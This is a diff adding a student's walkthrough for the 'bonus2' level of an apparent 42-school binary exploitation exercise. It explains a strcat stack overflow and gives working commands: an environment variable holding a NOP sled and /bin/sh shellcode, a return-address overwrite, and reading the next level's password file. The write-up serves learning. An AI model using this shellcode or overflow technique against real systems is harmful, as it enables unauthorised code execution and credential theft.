@@ -1,0 +1,34 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2021/04/25 20:18:52 by fcadet            #+#    #+#              #
+#    Updated: 2021/04/25 22:07:18 by fcadet           ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+- up to 40 bytes can be copied from argv[1] to str and 32 bytes from argv[2] can
+be appened to them, so in greetuser, str can contain up to 72 bytes
+
+- we can see that s can contain those 72 bytes but the greeting message copied in
+it before strcat make it overflow
+
+- so we can overwrite greetuser return address and replace it with the address of
+a global variable that contains a shellcode
+
+- 1st we make our export with a large enough NOP field to correct address randomness
+	- export EXPLOIT=$(ruby -e 'print "\x90" * 128 +
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"')
+
+- then we choose the language that will make s overflow (13 bytes for "nl")
+	- export LANG=nl
+
+- we use the env_checker to find the approximate EXPLOIT address
+	- EXPLOIT ~@ 0xbffff89a	+ 0x40 = 0xbffff8da
+
+- finally, we can build our exploit command
+	- ./bonus2 $(ruby -e 'print "x" * 40 + " " + "x" * (32 - 13 + 4) + "\xda\xf8\xff\xbf"')
+	- cat /home/user/bonus3/.pass
